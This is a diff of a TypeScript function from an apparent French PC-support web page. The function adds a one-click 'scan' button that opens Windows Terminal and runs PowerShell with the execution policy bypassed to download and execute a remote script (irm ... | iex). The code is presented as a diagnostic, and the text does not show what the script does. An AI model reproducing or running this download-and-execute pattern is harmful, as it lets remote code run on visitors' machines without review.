@@ -806,15 +806,29 @@ function updateScanTrigger(_isWin11: boolean) {
   const trigger = document.getElementById("sospc-scan-trigger") as HTMLElement;
   if (!trigger) return;
 
-  // Toujours afficher le bouton wt: — la détection OS navigateur est trop peu fiable
   const cmdBox = document.getElementById("sospc-cmd-box") as HTMLElement;
   if (cmdBox) cmdBox.style.display = "none";
-  trigger.innerHTML =
-    '<a id="sospc-wt-link" href="wt: -d . powershell.exe -NoProfile -ExecutionPolicy Bypass -Command &quot;$s=\'' +
+
+  const wtUrl =
+    "wt: -d . powershell.exe -NoProfile -ExecutionPolicy Bypass -Command &quot;$s='" +
     sessionId +
-    '\'; irm https://talos-int.com/diag.ps1 | iex&quot;" class="sospc-wt-btn">🚀 Scanner maintenant (1 clic)</a>' +
+    "'; irm https://talos-int.com/diag.ps1 | iex&quot;";
+
+  trigger.innerHTML =
+    '<button id="sospc-wt-btn" class="sospc-wt-btn">🚀 Scanner maintenant (1 clic)</button>' +
     '<div class="sospc-scan-sub">Windows Terminal va s\'ouvrir automatiquement</div>';
   trigger.style.display = "block";
+
+  // Utiliser JavaScript pour déclencher le protocole (plus fiable qu'un <a href>)
+  document.getElementById("sospc-wt-btn")?.addEventListener("click", () => {
+    try {
+      window.location.href = wtUrl;
+    } catch {
+      // Fallback : ouvrir via window.open
+      const w = window.open(wtUrl, "_blank");
+      if (w) setTimeout(() => w.close(), 500);
+    }
+  });
 }
 
 // Écoute le résultat du scan navigateur
